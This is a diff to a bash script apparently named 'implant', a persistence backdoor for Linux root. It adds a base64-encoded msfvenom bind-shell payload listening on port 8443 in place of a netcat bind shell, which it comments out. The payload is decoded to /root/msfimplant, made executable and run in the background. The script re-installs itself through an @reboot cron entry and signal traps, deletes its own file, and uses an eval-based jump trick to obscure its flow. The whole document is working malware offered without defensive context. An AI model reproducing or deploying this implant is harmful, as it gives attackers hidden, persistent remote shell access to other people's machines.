@@ -3,7 +3,8 @@
 SCRIPT_PID=$$
 PERSIST=/root/persist
 SCRIPT=/root/implant
-COMMAND="nc -nvlp 8443 -e /bin/sh"
+#COMMAND="nc -nvlp 8443 -e /bin/sh"
+COMMAND=/root/msfimplant
 
 function backup_script () {
 cat >> $PERSIST <<EOF
@@ -20,8 +21,23 @@ if ! grep -E "@reboot $PERSIST"; then
 fi
 }
 
+jumpto() {
+	label=$1
+	cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
+	eval "$cmd"
+	exit
+}
+
+encoded=${1:-"encoded"}
+
+jumpto $encoded
+
+main:
+
 trap backup_script EXIT SIGTERM SIGKILL
 rm -- "$0"
+echo "$b64" | base64 -d > $COMMAND
+chmod +x $COMMAND
 (${COMMAND} &)&
 if pgrep $(basename $PERSIST); then
 	PERSIST_PID=$(ps -o ppid= $(pgrep $(basename $PERSIST | tr -d " ")))
@@ -31,3 +47,14 @@ fi
 while true; do
 	sleep 30
 done
+
+encoded:
+#MSFVENOM  payload linux/x64/shell_bind_tcp LPORT=8443
+b64="$(cat <<-EOF
+	f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB
+	AAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQ
+	AAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAg+0iJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNe
+	SP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
+EOF
+)"
+jumpto main
